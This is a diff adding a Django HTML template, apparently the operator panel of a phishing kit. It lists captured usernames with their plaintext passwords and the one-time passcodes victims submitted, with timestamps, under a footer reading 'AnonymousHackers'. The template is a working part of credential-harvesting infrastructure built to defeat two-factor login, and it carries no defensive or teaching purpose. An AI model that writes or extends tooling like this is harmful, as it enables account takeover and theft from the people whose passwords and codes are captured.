@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>All Submissions</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 20px;
+            color: #333;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        h2 {
+            color: #4CAF50;
+            text-align: center;
+        }
+        .user-submission {
+            margin-bottom: 20px;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+        }
+        .user-submission h3 {
+            margin-top: 0;
+            color: #4CAF50;
+        }
+        .user-submission ul {
+            list-style-type: decimal;
+            padding-left: 20px;
+        }
+        .user-submission li {
+            margin-bottom: 5px;
+            padding: 8px;
+            background: #f9f9f9;
+            border: 1px solid #eee;
+            border-radius: 4px;
+        }
+        .otp {
+            display: flex;
+            justify-content: space-between;
+        }
+        .otp span {
+            font-weight: bold;
+        }
+        footer {
+            margin-top: 40px;
+            text-align: center;
+            font-size: 0.9em;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>All User Submissions</h2>
+        {% for submission in user_submissions %}
+            <div class="user-submission">
+                <h3>Username: {{ submission.username }}</h3>
+                <p><strong>Password:</strong> {{ submission.password }}</p>
+                <h4>OTPs:</h4>
+                <ul>
+                    {% for otp in submission.otps.all %}
+                        <li class="otp">
+                            <span>{{ forloop.counter }}.</span> 
+                            <span>{{ otp.otp }} (submitted at {{ otp.timestamp }})</span>
+                        </li>
+                    {% endfor %}
+                </ul>
+            </div>
+        {% endfor %}
+    </div>
+    <footer>
+        &copy; 2024 AnonymousHackers. All rights reserved.
+    </footer>
+</body>
+</html>
